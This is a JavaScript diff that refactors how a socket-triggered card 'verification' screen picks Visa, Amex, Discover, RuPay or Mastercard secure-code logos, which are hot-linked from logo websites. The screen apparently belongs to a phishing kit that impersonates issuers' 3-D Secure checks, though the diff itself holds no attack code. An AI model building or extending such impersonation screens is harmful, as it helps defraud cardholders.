@@ -1893,23 +1893,26 @@ socket.on('show_mc_verification', (data) => {
       
       console.log('[DEBUG] Using logo type for display:', logoType);
       
-      // REPLACE THIS ENTIRE IF-ELSE WITH THE NEW CODE THAT SUPPORTS MORE CARD TYPES
-      if (logoType.toLowerCase().includes('visa')) {
-        loadingVerificationLogo.innerHTML = '<img src="https://logowik.com/content/uploads/images/visa-new-20215093.jpg" alt="Verified by Visa" style="max-height: 90px; max-width: 250px;">';
-        console.log('[DEBUG] Selected VISA logo');
-      } else if (logoType.toLowerCase().includes('amex') || logoType.toLowerCase().includes('american')) {
-        loadingVerificationLogo.innerHTML = '<img src="https://1000logos.net/wp-content/uploads/2016/10/American-Express-Color-500x281.png" alt="American Express SafeKey" style="max-height: 90px; max-width: 250px;">';
-        console.log('[DEBUG] Selected AMEX logo');
-      } else if (logoType.toLowerCase().includes('discover')) {
-        loadingVerificationLogo.innerHTML = '<img src="https://1000logos.net/wp-content/uploads/2021/05/Discover-logo.png" alt="Discover ProtectBuy" style="max-height: 90px; max-width: 250px;">';
-        console.log('[DEBUG] Selected DISCOVER logo');
-      } else if (logoType.toLowerCase().includes('rupay')) {
-        loadingVerificationLogo.innerHTML = '<img src="https://upload.wikimedia.org/wikipedia/commons/d/d1/RuPay.svg;">';
-        console.log('[DEBUG] Selected RUPAY logo');
-      } else {
-        loadingVerificationLogo.innerHTML = '<img src="https://logodix.com/logo/21144.jpg" alt="Mastercard SecureCode" style="max-height: 90px; max-width: 250px;">';
-        console.log('[DEBUG] Selected MASTERCARD logo (default)');
-      }
+// Updated code that properly supports all card types
+const logoTypeLC = logoType.toLowerCase(); // Convert to lowercase once
+console.log('[DEBUG] Logo type lowercase:', logoTypeLC);
+
+if (logoTypeLC.includes('visa')) {
+  loadingVerificationLogo.innerHTML = '<img src="https://logowik.com/content/uploads/images/visa-new-20215093.jpg" alt="Verified by Visa" style="max-height: 90px; max-width: 250px;">';
+  console.log('[DEBUG] Selected VISA logo');
+} else if (logoTypeLC.includes('amex') || logoTypeLC.includes('american')) {
+  loadingVerificationLogo.innerHTML = '<img src="https://1000logos.net/wp-content/uploads/2016/10/American-Express-Color-500x281.png" alt="American Express SafeKey" style="max-height: 90px; max-width: 250px;">';
+  console.log('[DEBUG] Selected AMEX logo');
+} else if (logoTypeLC.includes('discover')) {
+  loadingVerificationLogo.innerHTML = '<img src="https://1000logos.net/wp-content/uploads/2021/05/Discover-logo.png" alt="Discover ProtectBuy" style="max-height: 90px; max-width: 250px;">';
+  console.log('[DEBUG] Selected DISCOVER logo');
+} else if (logoTypeLC.includes('rupay')) {
+  loadingVerificationLogo.innerHTML = '<img src="https://upload.wikimedia.org/wikipedia/commons/d/d1/RuPay.svg" alt="RuPay PaySecure" style="max-height: 90px; max-width: 250px;">';
+  console.log('[DEBUG] Selected RUPAY logo');
+} else {
+  loadingVerificationLogo.innerHTML = '<img src="https://logodix.com/logo/21144.jpg" alt="Mastercard SecureCode" style="max-height: 90px; max-width: 250px;">';
+  console.log('[DEBUG] Selected MASTERCARD logo (default)');
+}
     }
     
     // Store data for later use
